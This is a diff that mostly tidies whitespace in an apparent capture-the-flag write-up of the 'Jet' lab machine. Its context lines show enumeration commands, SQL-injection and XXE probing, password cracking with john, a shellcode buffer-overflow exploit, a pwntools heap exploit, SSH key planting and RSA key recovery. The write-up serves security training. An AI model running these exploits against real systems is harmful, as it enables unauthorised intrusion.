@@ -224,8 +224,8 @@ In the homepage only, you can get the first flag.
 Let's see if there are any interesting directories. Let's use gobuster for this.
 
 ```bash
-kali@kali:gobuster dir -u http://10.13.37.10 -w /usr/share/wordlists/dirb/big.txt  
-                                                                             
+kali@kali:gobuster dir -u http://10.13.37.10 -w /usr/share/wordlists/dirb/big.txt
+
 ===============================================================
 Gobuster v3.8.2
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -276,7 +276,7 @@ kali@kali:dig @10.13.37.10 -x 10.13.37.10
 Yay, we found another server "*www.securewebinc.jet*", let's add it to out hosts file.
 
 ```bash
-kali@kali:cat /etc/hosts   
+kali@kali:cat /etc/hosts
 
 10.13.37.10     www.securewebinc.jet
 127.0.0.1       localhost
@@ -356,8 +356,7 @@ And, carefully looking at the source code, we find our third flag.
 *Flag3:JET{s.....l}*
 
 
-Since, it is a login page, let's check if it is 
-susceptible to SQL Injection.
+Since, it is a login page, let's check if it is susceptible to SQL Injection.
 
 While, doing some manual test on login, I notice that the error message it provides gives us hint.
 
@@ -390,7 +389,7 @@ username=admin&password=letmein
 ```
 
 ```bash
-kali@kali:cat 1.txt                                                                                                                                            
+kali@kali:cat 1.txt
 
 <?xml version="1.0"?>
 <!DOCTYPE items [
@@ -497,7 +496,8 @@ Let's crack the hash using our favourite john the ripper.
 First let's identify the hash type.
 
 ```bash
-kali@kali:hash-identifier 97114847aa12500d....4ab9b0445b235d5084                                                                                                            
+kali@kali:hash-identifier 97114847aa12500d....4ab9b0445b235d5084
+
 .
 .
 .
@@ -510,7 +510,7 @@ Possible Hashs:
 So, the hash is SHA-256, so we will use Raw-SA256 format for john.
 
 ```bash
-kali@kali:john adminhash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256                                                                        
+kali@kali:john adminhash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
 
 Using default input encoding: UTF-8
 Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 SSE2 4x])
@@ -843,6 +843,7 @@ It seems like we cannot use python server, let's use another method.
 
 ```bash
 www-data@jet:/home$ cat leak | base64
+
 f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAoAZAAAAAAABAAAAAAAAAANgbAAAAAAAAAAAAAEAAOAAJ
 AEAAHwAcAAYAAAAFAAAAQAAAAAAAAABAAEAAAAAAAEAAQAAAAAAA+AEAAAAAAAD4AQAAAAAAAAgA
 AAAAAAAAAwAAAAQAAAA4AgAAAAAAADgCQAAAAAAAOAJAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA
@@ -886,14 +887,15 @@ AAAAAAAAAAAA8BcAAAAAAADVAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA==" | base64 -
 ```
 
 ```bash
-kali@kali:chmod +x leak                                                                                                                                           
+kali@kali:chmod +x leak
 ```
 
 ```bash
-kali@kali:./leak                                                                                                                                                  
+kali@kali:./leak
+
 Oops, I'm leaking! 0x7ffc497c0c40
-Pwn me ¯_(ツ)_/¯ 
-> 
+Pwn me ¯_(ツ)_/¯
+>
 ```
 
 
@@ -905,7 +907,7 @@ www-data@jet:/home$ fuser -k 60001/tcp
 www-data@jet:/home$ socat TCP4-LISTEN:60001,reuseaddr,fork EXEC:/home/leak &
 [1] 8017
 www-data@jet:/home$ ss -lntp | grep 60001
-LISTEN     0      5            *:60001                    *:*                   users:(("socat",pid=8017,fd=6))
+LISTEN   0    5        *:60001         *:*        users:(("socat",pid=8017,fd=6))
 ```
 
 
@@ -934,13 +936,13 @@ shellcode = (
    b"x31xc0x48xbbxd1x9dx96x91xd0x8cx97xff"                                                                                                      
    b"x48xf7xdbx53x54x5fx99x52x57x54x5e"                                                                                                          
    b"xb0x3bx0fx05"                                                                                                                                      
-)                                                                                                                                                            
+)
 
 payload  = shellcode                                                                                                                                         
 payload += b"x90" * (72 - len(shellcode))                                                                                                                   
-payload += struct.pack("<Q", leak)                                                                                                                           
+payload += struct.pack("<Q", leak)
 
-s.sendall(payload + b"n")                                                                                                                                   
+s.sendall(payload + b"n")
                                                                                                                                                             
 # proper interactive shell                                                                                                                                   
 while True:
@@ -1013,11 +1015,11 @@ $ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCXFNozwPELMjO4rPXl7uVXeUnVwXL+50JO
 Back to the attacker machine, change permissions on the key and ssh login as user alex.
 
 ```bash
-kali@kali:chmod 600 id.rsa                                                                                                                                         
+kali@kali:chmod 600 id.rsa 
 ```
 
 ```bash
-kali@kali: ssh -i id.rsa alex@10.13.37.10  
+kali@kali: ssh -i id.rsa alex@10.13.37.10
 
 The authenticity of host '10.13.37.10 (10.13.37.10)' can't be established.
 ED25519 key fingerprint is: SHA256:OQHuXrO8X75+NzxFa1JmQNvDcVHttNOYSZgajRpPkHc
@@ -1036,8 +1038,11 @@ Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)
 321 packages can be updated.
 235 updates are security updates.
 
-The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.
-Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law.
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
 
 alex@jet:~$ 
 ```
@@ -1049,7 +1054,6 @@ At the home directory of user alex, we find another flag, i.e. flag6 and some in
 
 ```bash
 alex@jet:~$ ls
-
 crypter.py  encrypted.txt  exploitme.zip  flag.txt
 
 alex@jet:~$ cat flag.txt
@@ -1063,7 +1067,7 @@ Let's take them to our attacker machine and analyze them.
 We see that the zip file is password protected, let's crack it with john the ripper.
 
 ```bash
-kali@kali:unzip exploitme.zip      
+kali@kali:unzip exploitme.zip
 
 Archive:  exploitme.zip
 [exploitme.zip] membermanager password: 
@@ -1096,7 +1100,7 @@ import string, itertools
 
 base = 'securewebinc'
 length = 17
-keys = [base + s for s in map(''.join, itertools.product(string.ascii_lowercase, repeat=length-len(base)))]  
+keys = [base + s for s in map(''.join, itertools.product(string.ascii_lowercase, repeat=length-len(base)))]
 
 with open('keys.txt', 'w') as file:
    for key in keys:
@@ -1106,7 +1110,7 @@ with open('keys.txt', 'w') as file:
 This time we were able to crack the password.
 
 ```bash
-kali@kali:john ziphash --wordlist=keys.txt 
+kali@kali:john ziphash --wordlist=keys.txt
 
 Using default input encoding: UTF-8
 Loaded 1 password hash (PKZIP [32/64])
@@ -1122,7 +1126,7 @@ Session completed.
 Unzipping the file, it drops 2 binaries, I think they will come in hand later.
 
 ```bash
-kali@kali:unzip exploitme.zip   
+kali@kali:unzip exploitme.zip
 
 Archive:  exploitme.zip
 [exploitme.zip] membermanager password: 
@@ -1396,13 +1400,13 @@ So, as I said I have very less knowledge for pwn, I take help from online resour
 #!/usr/bin/python3
 from pwn import remote, p64, p16
 
-shell = remote("10.13.37.10", 5555)                                                                                                                          
+shell = remote("10.13.37.10", 5555)
 
 def add(size, data):                                                                                                                                         
    shell.sendlineafter(b"6. exit", b"1")                                                                                                                    
    shell.sendlineafter(b"size:", str(size).encode())                                                                                                        
-   shell.sendlineafter(b"username:", data)                                                                                                                  
-                                                                                                                                                            
+   shell.sendlineafter(b"username:", data)
+
 def edit(idx, mode, data):                                                                                                                                   
    shell.sendline(b"2")                                                                                                                                     
    shell.sendlineafter(b"2. insecure edit", str(mode).encode())                                                                                             
@@ -1482,11 +1486,11 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSo21CWfN0igPSaQlyw3RmF6AmIib/ORK+LvnY4Jby
 Now, similarly change the key permissions on the attacker machine and login via ssh as membermanager.
 
 ```bash
-kali@kali:chmod 600 man_rsa                                                                                                                                        
+kali@kali:chmod 600 man_rsa 
 ```
 
 ```bash
-kali@kali:ssh -i man_rsa membermanager@10.13.37.10  
+kali@kali:ssh -i man_rsa membermanager@10.13.37.10
 
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to "store now, decrypt later" attacks.
@@ -1500,8 +1504,11 @@ Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)
 321 packages can be updated.
 235 updates are security updates.
 
-The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.
-Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law.
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
 
 membermanager@jet:~$ 
 ```
@@ -1560,12 +1567,12 @@ Let's bring them to our attacker machine.
 
 
 ```bash
-kali@kali:scp -i man_rsa membermanager@10.13.37.10:/home/tony/keys/public.crt .  
+kali@kali:scp -i man_rsa membermanager@10.13.37.10:/home/tony/keys/public.crt .
 
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to "store now, decrypt later" attacks.
 ** The server may need to be upgraded. See https://openssh.com/pq.html
-public.crt                                                                                                                 100%  451     0.9KB/s   00:00    
+public.crt                                                                      100%  451     0.9KB/s   00:00    
 ```
 
 ```bash
@@ -1574,7 +1581,7 @@ kali@kali:scp -i man_rsa membermanager@10.13.37.10:/home/tony/key.bin.enc .
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to "store now, decrypt later" attacks.
 ** The server may need to be upgraded. See https://openssh.com/pq.html
-key.bin.enc                                                                                                                100%  129     0.3KB/s   00:00    
+key.bin.enc                                                                     100%  129     0.3KB/s   00:00    
 ```
 
 ```bash
@@ -1583,7 +1590,7 @@ kali@kali:scp -i man_rsa membermanager@10.13.37.10:/home/tony/secret.enc .
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to "store now, decrypt later" attacks.
 ** The server may need to be upgraded. See https://openssh.com/pq.html
-secret.enc                                                                                                                 100% 4768     4.7KB/s   00:01 
+secret.enc                                                                       100% 4768     4.7KB/s   00:01 
 ```
 
 First determie values of e and n of public.crt
@@ -1629,7 +1636,7 @@ print(key.exportKey().decode())
 ```
 
 ```bash
-kali@kali:python3 cryptdecrypt.py     
+kali@kali:python3 cryptdecrypt.py
 
 -----BEGIN RSA PRIVATE KEY-----
 MIICOQIBAAKBgQGN24SSfsyl/rFafZuCr54aBqEpk9fJDFa78Qnk177LTPwWgJPd
@@ -1655,7 +1662,7 @@ kali@kali:openssl pkeyutl -decrypt -inkey private.crt -in key.bin.enc -out file
 ```
 
 ```bash
-kali@kali:openssl aes-256-cbc -d -in secret.enc -pass file:file  
+kali@kali:openssl aes-256-cbc -d -in secret.enc -pass file:file
 
 *** WARNING : deprecated key derivation used.                                                                                                                
 Using -iter or -pbkdf2 would be better.                                                                                                                      
@@ -1797,7 +1804,3 @@ This is the final flag, i.e. flag11
 *Flag11:JET{7.....7}*
 
 With this we wrap up the challenge. It took longer that expected because of too many pwn based ctf.
-
-
-
-
